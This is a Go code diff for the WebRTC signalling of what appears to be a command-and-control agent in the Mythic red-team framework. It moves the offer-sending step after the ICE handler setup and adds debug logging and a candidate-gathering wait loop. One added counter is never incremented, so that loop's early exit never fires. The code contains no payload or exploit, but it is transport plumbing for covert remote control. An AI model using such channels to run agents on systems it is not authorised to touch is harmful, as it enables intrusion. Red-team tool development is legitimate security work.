@@ -929,7 +929,6 @@ func (c *C2WebRTC) connectSignaling() bool {
 }
 
 // Exchange SDP and ICE candidates with the server
-// Exchange SDP and ICE candidates with the server
 func (c *C2WebRTC) exchangeSDP() bool {
 	utils.PrintDebug("Setting up WebRTC")
 
@@ -948,50 +947,13 @@ func (c *C2WebRTC) exchangeSDP() bool {
 		return false
 	}
 
-	// Convert webrtc.SessionDescription to sdp.SessionDescription
-	var offerSDP sdp.SessionDescription
-	if err := offerSDP.Unmarshal([]byte(offer.SDP)); err != nil {
-		utils.PrintDebug(fmt.Sprintf("Failed to parse offer SDP: %v", err))
-		return false
-	}
-
-	// Prepare offer message
-	offerMessage := SignalMessage{
-		Type:        "offer",
-		Destination: "answer",
-		SDP:         offerSDP, // Now using sdp.SessionDescription
-		AuthKey:     c.AuthKey,
-		AgentUUID:   GetMythicID(),
-	}
-
-	// Debug: Print the message structure but truncate SDP for readability
-	debugMsg := offerMessage
-	sdpBytes, _ := debugMsg.SDP.Marshal()
-	if len(sdpBytes) > 100 {
-		// Create a truncated version for debug
-		var truncatedSDP sdp.SessionDescription
-		truncatedSDP.Unmarshal(sdpBytes[:100])
-		debugMsg.SDP = truncatedSDP
-		utils.PrintDebug(fmt.Sprintf("Sending offer message: %+v... (SDP truncated)", debugMsg))
-	} else {
-		utils.PrintDebug(fmt.Sprintf("Sending offer message: %+v", debugMsg))
-	}
-
-	// Send the actual message
-	utils.PrintDebug(fmt.Sprintf("Sending offer message (full message): %+v", offerMessage))
-	if err := c.SignalingConn.WriteJSON(offerMessage); err != nil {
-		utils.PrintDebug(fmt.Sprintf("Failed to send offer: %v", err))
-		return false
-	}
-
-	utils.PrintDebug("Offer sent successfully, waiting for response...")
-
+	// *** IMPORTANT: Create channels BEFORE sending the offer ***
 	// Create channels for SDP and ICE candidates
 	sdpChan := make(chan webrtc.SessionDescription, 1)
 	candidateChan := make(chan webrtc.ICECandidateInit, 10)
 	doneChan := make(chan bool, 1)
 
-	// Handle ICE candidates
+	// Set up ICE candidate handler before sending the offer
 	c.PeerConnection.OnICECandidate(func(candidate *webrtc.ICECandidate) {
 		if candidate == nil {
 			utils.PrintDebug("Received nil ICE candidate, not sending")
@@ -1031,6 +993,43 @@ func (c *C2WebRTC) exchangeSDP() bool {
 			utils.PrintDebug("Successfully sent ICE candidate")
 		}
 	})
+
+	// Convert webrtc.SessionDescription to sdp.SessionDescription for sending
+	var offerSDP sdp.SessionDescription
+	if err := offerSDP.Unmarshal([]byte(offer.SDP)); err != nil {
+		utils.PrintDebug(fmt.Sprintf("Failed to parse offer SDP: %v", err))
+		return false
+	}
+
+	// Prepare offer message
+	offerMessage := SignalMessage{
+		Type:        "offer",
+		Destination: "answer",
+		SDP:         offerSDP,
+		AuthKey:     c.AuthKey,
+		AgentUUID:   GetMythicID(),
+	}
+
+	// Debug logging
+	debugMsg := offerMessage
+	sdpBytes, _ := debugMsg.SDP.Marshal()
+	if len(sdpBytes) > 100 {
+		var truncatedSDP sdp.SessionDescription
+		truncatedSDP.Unmarshal(sdpBytes[:100])
+		debugMsg.SDP = truncatedSDP
+		utils.PrintDebug(fmt.Sprintf("Sending offer message: %+v... (SDP truncated)", debugMsg))
+	} else {
+		utils.PrintDebug(fmt.Sprintf("Sending offer message: %+v", debugMsg))
+	}
+
+	// Send the actual message
+	utils.PrintDebug(fmt.Sprintf("Sending offer message (full message): %+v", offerMessage))
+	if err := c.SignalingConn.WriteJSON(offerMessage); err != nil {
+		utils.PrintDebug(fmt.Sprintf("Failed to send offer: %v", err))
+		return false
+	}
+
+	utils.PrintDebug("Offer sent successfully, waiting for response...")
 
 	// Start a goroutine to handle signaling messages
 	go func() {
@@ -1097,6 +1096,8 @@ func (c *C2WebRTC) exchangeSDP() bool {
 					Candidate: msg.Candidate,
 				}
 
+				utils.PrintDebug(fmt.Sprintf("Received ICE candidate: %s", candidate.Candidate))
+
 				// Send the candidate to the channel
 				candidateChan <- candidate
 
@@ -1115,10 +1116,32 @@ func (c *C2WebRTC) exchangeSDP() bool {
 		}
 	}()
 
+	// *** IMPORTANT: Give ICE candidates time to be gathered before setting remote description ***
+	// Wait a short time to allow local candidates to be gathered
+	gatheringTime := time.After(2 * time.Second)
+	candidatesGathered := 0
+
+gathering:
+	for {
+		select {
+		case <-gatheringTime:
+			utils.PrintDebug(fmt.Sprintf("ICE candidate gathering initial phase complete, gathered %d candidates", candidatesGathered))
+			break gathering
+
+		case <-time.After(500 * time.Millisecond):
+			// Check if any candidates have been generated
+			if candidatesGathered > 0 {
+				utils.PrintDebug("At least one ICE candidate was generated, continuing...")
+				break gathering
+			}
+		}
+	}
+
 	// Wait for the answer SDP
 	select {
 	case sdp := <-sdpChan:
 		// Set the remote description
+		utils.PrintDebug("Received SDP answer, setting remote description")
 		err = c.PeerConnection.SetRemoteDescription(sdp)
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("Failed to set remote description: %v", err))
@@ -1140,7 +1163,8 @@ func (c *C2WebRTC) exchangeSDP() bool {
 	for {
 		select {
 		case candidate := <-candidateChan:
-			// Add the ICE candidate
+			// Print the candidate details
+			utils.PrintDebug(fmt.Sprintf("Received ICE candidate: %s", candidate.Candidate))
 			if c.PeerConnection != nil {
 				err = c.PeerConnection.AddICECandidate(candidate)
 				if err != nil {
